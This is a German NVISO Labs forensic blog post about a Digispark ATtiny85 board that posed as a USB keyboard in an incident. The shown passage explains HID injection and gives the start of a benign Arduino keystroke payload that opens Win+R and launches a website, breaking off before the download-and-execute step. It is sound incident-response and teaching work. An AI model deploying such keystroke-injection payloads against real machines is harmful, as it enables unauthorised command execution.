---
title: Verborgene Tastenanschläge: Forensische Analyse eines Digispark HID-Geräts
url: https://blog.nviso.eu/2026/10/20/verborgene-tastenanschlage-forensische-analyse-eines-digispark-hid-gerats/
source: NVISO Labs
date: 2026-10-20
fetch_date: 2026-10-21T06:48:49.687310
---

# Verborgene Tastenanschläge: Forensische Analyse eines Digispark HID-Geräts

[Skip to content](#content)

[![NVISO Labs](https://blog.nviso.eu/wp-content/uploads/2022/12/cropped-abn-zcrj_400x400-1.png)](https://blog.nviso.eu/)

[NVISO Labs](https://blog.nviso.eu/)

Cyber security research, straight from the lab! 🐀

* [linkedin](https://www.linkedin.com/company/nviso-cyber)
* mail us
* [our company](https://www.nviso.eu)
* [SSO](https://blog.nviso.eu/wp-admin/edit.php)
* Search for:Search Button

Menu

* [All](https://blog.nviso.eu/)
* [Prevent](https://blog.nviso.eu/category/prevent/)
  + [Application Security](https://blog.nviso.eu/category/prevent/application-security/)
    - [IoT Security](https://blog.nviso.eu/category/prevent/iot-security/)
    - [Web Security](https://blog.nviso.eu/category/prevent/web-security/)
    - [Mobile Security](https://blog.nviso.eu/category/prevent/mobile-security/)
    - [Industrial Security](https://blog.nviso.eu/category/prevent/industrial-security/)
    - [AI Security](https://blog.nviso.eu/category/prevent/application-security/ai-security/)
  + [Cloud Security](https://blog.nviso.eu/category/prevent/cloud-security/)
    - [AWS](https://blog.nviso.eu/category/prevent/cloud-security/aws/)
    - [Azure](https://blog.nviso.eu/category/prevent/cloud-security/azure/)
    - [GCP](https://blog.nviso.eu/category/prevent/cloud-security/gcp/)
    - [Microsoft 365](https://blog.nviso.eu/category/prevent/cloud-security/microsoft-365/)
  + [Awareness](https://blog.nviso.eu/category/prevent/awareness/)
  + [Cyber Strategy](https://blog.nviso.eu/category/prevent/cyber-strategy/)
  + [Red Team](https://blog.nviso.eu/category/prevent/red-team/)
* [Detect](https://blog.nviso.eu/category/detect/)
  + [Blue Team](https://blog.nviso.eu/category/detect/blue-team/)
  + [Purple Team](https://blog.nviso.eu/category/detect/purple-team/)
* [Respond](https://blog.nviso.eu/category/respond/)
  + [Forensics](https://blog.nviso.eu/category/respond/forensics/)
* Other
  + [Events](https://blog.nviso.eu/category/events/)

# Verborgene Tastenanschläge: Forensische Analyse eines Digispark HID-Geräts

[Kilian Neumair](https://blog.nviso.eu/author/kilian-neumair/)

[Cyber Threats](https://blog.nviso.eu/category/cyber-threats/), [Forensics](https://blog.nviso.eu/category/respond/forensics/), [Incident Response](https://blog.nviso.eu/category/incident-response/)

October 20, 2026October 20, 2026
18 Minutes

By

[Kilian Neumair](https://blog.nviso.eu/author/kilian-neumair/) , [Louis Flamion](https://blog.nviso.eu/author/louis-flamion/)

October 20, 2026

![English flag](https://blog.nviso.eu/wp-content/uploads/2026/08/image-17.png)

This blog post is also available in
[English](https://blog.nviso.eu/2026/10/16/keystrokes-in-disguise-forensic-analysis-of-a-digispark-hid-device/).

Bei einer unserer jüngsten Incident-Response-Untersuchungen stießen wir auf ein kleines, günstiges USB-Gerät: den [Digispark Rev.3](https://www.az-delivery.de/en/products/digispark-board) mit ATtiny85-Mikrocontroller. Trotz seiner Größe und des niedrigen Preises ist das Gerät vielfältig einsetzbar. Es ist online leicht erhältlich und kostet in der Regel nur wenige Euro.

![](https://blog.nviso.eu/wp-content/uploads/2026/07/Digispark-1-1024x730.jpg)

Digispark Rev.3

Auf den ersten Blick wirkt der Digispark wie ein harmloses Entwicklungsboard. In der Praxis lässt er sich jedoch für verschiedenste Zwecke programmieren. In unserem Fall war er so konfiguriert, dass er sich als USB-Tastatur ausgab und nach dem Einstecken automatisch Tastatureingaben an ein Zielsystem sendete. Im Grunde verhielt er sich wie ein USB-[Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky).

Ein USB-Rubber Ducky ist ein bekanntes Angriffswerkzeug, das sich als vertrauenswürdige Tastatur ausgibt und vordefinierte Tastatureingaben an ein System übermittelt. Geräte wie ein USB-Rubber Ducky und Digispark werden häufig für einmalige Angriffe eingesetzt. Nach dem Einstecken führen sie innerhalb weniger Sekunden bösartige Aktionen aus und können wieder entfernt werden, bevor sie einen Verdacht erregen. Je nach Payload können diese Aktionen beispielsweise Befehle ausführen, zusätzliche Malware herunterladen oder Anwendungen und Websites öffnen.

Der Einsatz beschränkt sich jedoch nicht auf kurzfristige Angriffe. Sie können auch über längere Zeit angeschlossen bleiben, um Benutzeraktivitäten zu simulieren, das Sperren des Bildschirms zu verhindern, ähnlich wie ein [Mouse Jiggler](https://en.wikipedia.org/wiki/Mouse_jiggler), oder den Eindruck zu erwecken, dass jemand aktiv am Rechner arbeitet. Ebenso lassen sie sich für weniger schwerwiegende, aber störende Zwecke missbrauchen, etwa um zufälligen Text einzugeben, unerwünschte Tastenkombinationen auszulösen, Fenster zu öffnen oder Einstellungen zu ändern.

Der wesentliche Unterschied zwischen Rubber Ducky zum Digispark ist der Speicherort der Payload. Beim USB-Rubber Ducky befindet sich dieser auf einem austauschbaren Speichermedium, etwa einer SD-Karte. Beim Digispark ist die Logik dagegen direkt auf dem ATtiny85-Mikrocontroller gespeichert. Aus forensischer Sicht erschwert das die Analyse, da es keine leicht zugängliche Skriptdatei zur Auswertung gibt. Stattdessen muss der Code direkt vom Gerät extrahiert werden. Incident Responder benötigen daher möglicherweise sowohl Hardware-Analysen als auch hostbasierte Artefakte, um den Vorfall vollständig zu verstehen.

Ohne die richtige Vorbereitung kann dies riskant sein. Beweismittel könnten versehentlich verändert oder gelöscht oder die Platine sogar beschädigt werden. Bevor wir das tatsächliche Gerät analysierten, beschafften wir daher einen Digispark, um den Vorgang auszutesten und eine sichere Analysemethode zu entwickeln.

**In diesem Artikel zeigen wir den gesamten Ablauf, von der Einrichtung und Programmierung eines Digispark als Testgerät über das Testen seines Verhaltens beim Anschluss an ein System bis hin zum Auslesen und Analysieren der Firmware mit einem kostengünstigen Setup.**

**Hinweis**
Dieser Artikel dient ausschließlich Schulungs-, Forschungs- und autorisierten Sicherheitstestzwecken. BadUSB- und HID-Injection-Techniken (**Human Interface Device, also Computerperipherie wie Tastatur oder Maus**), bei denen sich ein Gerät als Eingabegerät wie eine Tastatur oder Maus ausgibt, können missbraucht werden. Setzen Sie sie daher nicht auf Systemen ein, die Ihnen nicht gehören oder für deren Tests Sie keine ausdrückliche Genehmigung haben.

# Einrichten des Digispark

Um eine passende Analysemethode zu identifizieren, müssen wir zuerst unser Testgerät konfigurieren.

## Programmieren des Geräts

**Voraussetzungen:**
• [Digispark-Treiber](https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip)
• [Arduino IDE](https://arduino-ide.org/download.html)
• [Zusätzliche Board-Manager-URL (drazzy)](https://drazzy.com/package_drazzy.com_index.json)
• [Zusätzliche Board-Manager-URL (Digistump)](https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json)
• Board Manager: Digistump AVR Boards
• Board: Digispark (Standard – 16,5 MHz)

Da der Digispark eine Tastatur emuliert, wird seine Firmware so konfiguriert, dass sie beim Einstecken automatisch vordefinierte Tastatureingaben sendet oder Befehle ausführt.

Für Demonstrationszwecke verwenden wir ausschließlich harmlose Payloads. Dazu gehören Aktionen, die ein Angreifer typischerweise durchführen könnte, etwa das Herunterladen und Ausführen weiterer Payloads aus dem Internet, sowie das Öffnen einer bestimmten Website zur Veranschaulichung des Konzepts.

C

```
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Execute the run prompt - Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Open a benign website
  DigiKeyboard.print("msedge nviso.eu");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Give browser time to launch
  DigiKeyboard.delay(5000);

  // Execute the ...